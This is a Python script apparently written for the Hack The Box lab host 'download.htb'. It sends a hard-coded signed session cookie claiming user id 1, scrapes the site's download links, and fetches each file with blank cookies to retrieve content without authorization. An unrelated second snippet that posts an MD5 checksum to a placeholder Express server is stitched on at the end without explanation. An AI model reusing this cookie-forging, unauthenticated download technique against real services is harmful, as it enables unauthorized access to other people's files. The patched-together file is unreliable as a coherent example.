#!/usr/bin/python3
import requests
from bs4 import BeautifulSoup

# Define the URL and headers
base_url = 'http://download.htb'
home_url = f'{base_url}/home/'
headers = {
    'Host': 'download.htb',
    'Cookie': 'download_session=eyJmbGFzaGVzIjp7ImluZm8iOltdLCJlcnJvciI6W10sInN1Y2Nlc3MiOltdfSwidXNlciI6eyJpZCI6MX19; download_session.sig=L-CbUTci83X7NoHNhIVqKhBCSDg',
    'Connection': 'close'
}

# Make the GET request to the home page
response = requests.get(home_url, headers=headers)

# Parse the HTML content
soup = BeautifulSoup(response.text, 'html.parser')

# Find all the download URLs
download_links = soup.find_all('a', href=True, text='Download')

# Loop through the download URLs
for link in download_links:
    download_path = link['href']
    download_url = f'{base_url}{download_path}'
    
    # Define new headers with different cookies
    download_headers = {
        'Host': 'download.htb',
        'Cookie': 'download_session=; download_session.sig=',
        'Connection': 'close'
    }
    
    # Send the GET request with the new headers
    download_response = requests.get(download_url, headers=download_headers)
    
    # Print the response content or do whatever you need with it
    print(f'Download URL: {download_url}')
    print(f'Response Status Code: {download_response.status_code}')
    print(download_response.text)
    print('-' * 50)



import hashlib
import requests

# Create a sample file content (e.g., a string)
file_content = b"This is the content of the file."

# Calculate MD5 checksum
md5_checksum = hashlib.md5(file_content).hexdigest()

# Send data to the Express.js server
url = 'http://your-express-server/upload'
payload = {
    'fileContent': file_content.decode('utf-8'),
    'md5Checksum': md5_checksum
}
response = requests.post(url, json=payload)

# Handle the server's response
print(response.text)
